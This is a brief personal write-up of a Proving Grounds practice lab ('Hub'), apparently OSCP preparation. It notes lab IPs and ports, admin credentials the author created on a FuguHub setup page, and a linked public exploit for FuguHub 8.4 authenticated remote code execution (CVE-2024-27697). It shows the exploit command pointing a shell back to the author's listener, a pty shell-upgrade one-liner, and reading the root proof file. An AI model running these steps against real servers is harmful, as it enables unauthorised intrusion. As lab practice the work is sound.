---
layout: post
title:  "Write Up: Proving Grounds Practice - Hub"
date:   2024-08-03 14:47:31 -0400
categories: oscp proving-grounds TJNull
---

192.168.160.25
me - 192.168.45.196

port 80 returns forbidden....

=========================================================================================================================

port 8082

has a fuguhub admin account set up screen, this seems like an easy in and going to pause on it for a sec and check the other port

============================================================================================================================

port 9999

returns 
```
���
```
 
=========================================================================================
FuguHub 8.4

port 8082

yomej76248@luvnish.com
jubjub
stinkyrinky


https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697

running 
> └─$ python3 exploit.py -r 192.168.160.25 -l 192.168.45.196 -p 1234

exploit failed but looking at the github page it looks like it tries to create a user and then run the exploit so restarting the server and going to run exploit again against a fresh deployment.

python3 -c 'import pty; pty.spawn("/bin/bash")'



this box sucks, it keeps hanging, I've gotten root but not the proof.....

ok, logged in and was able to cat out /root/proof.txt


